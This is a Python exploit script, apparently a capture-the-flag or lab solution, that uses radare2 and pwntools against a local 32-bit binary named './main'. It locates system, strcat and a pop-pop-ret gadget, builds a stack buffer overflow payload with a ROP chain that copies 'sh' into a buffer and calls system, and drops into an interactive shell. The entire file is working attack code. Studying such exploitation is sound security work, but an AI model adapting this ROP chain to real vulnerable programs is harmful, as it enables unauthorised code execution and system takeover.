import r2pipe
import json
from pwn import *

CONCAT = 0x0804850d
EXECUTE = 0x080484e6

STRING = 0x0804a060
SH = 0x0804a0c4

POP_POP_RET = 0x0804861a
APP = "./main"

# Load file
r2 = r2pipe.open(APP)
r2.cmd('aaaa')  # Analysis

symbols = json.loads(r2.cmd('isj'))
for i in symbols:
    if i['type'] == 'FUNC' and i['name'] == 'imp.system':
        EXECUTE = i['vaddr']
        print("{} find on {}".format(i['name'], hex(EXECUTE)))
    elif i['type'] == 'FUNC' and i['name'] == 'imp.strcat':  # Ret2LibC
        CONCAT = i['vaddr']
        print("{} find on {}".format(i['name'], hex(CONCAT)))
    elif i['type'] == 'FUNC' and i['name'] == 'concat_something':
        CONCAT = i['vaddr']
        print("{} find on {}".format(i['name'], hex(CONCAT)))
    elif i['type'] == 'OBJ' and i['name'] == 'string':
        STRING = i['vaddr']
        print("{} find on {}".format(i['name'], hex(STRING)))
    elif i['type'] == 'OBJ' and i['name'] == 'sh':
        SH = i['vaddr']
        print("{} find on {}".format(i['name'], hex(SH)))

POP_POP_RET = None
rops = json.loads(r2.cmd('/Rj'))
for r in rops:
    if (
            not POP_POP_RET and
            len(r['opcodes']) > 3 and
            r['opcodes'][-1]['opcode'] == 'ret' and
            r['opcodes'][-2]['opcode'].startswith('pop') and
            r['opcodes'][-3]['opcode'].startswith('pop')
    ):
        POP_POP_RET = r['opcodes'][-3]['offset']
        print("Rop find on {}".format(hex(POP_POP_RET)))
        break


s = process(APP)

# Uncomment for debugging
#gdb.attach(s, '''
#	b*0x080484e5
#	''')

payload = 'A'*128
payload += 'BBBB' # EBP

# ROP
# First call
payload += p32(CONCAT) # CONCAT
payload += p32(POP_POP_RET) # RET ADDRESS CONCAT (GADGET)
payload += p32(STRING) # 1 PARAM FOR SYSTEM
payload += p32(SH) # 2 PARAM FOR SYSTEM

# Second call
payload += p32(EXECUTE) # EXECUTE
payload += 'AAAA' # RET ADDRESS EXECUTE
payload += p32(STRING) # 2 PARAM FOR SYSTEM


payload += '\n'
s.send(payload)
print(s.recv())
s.interactive()
s.close()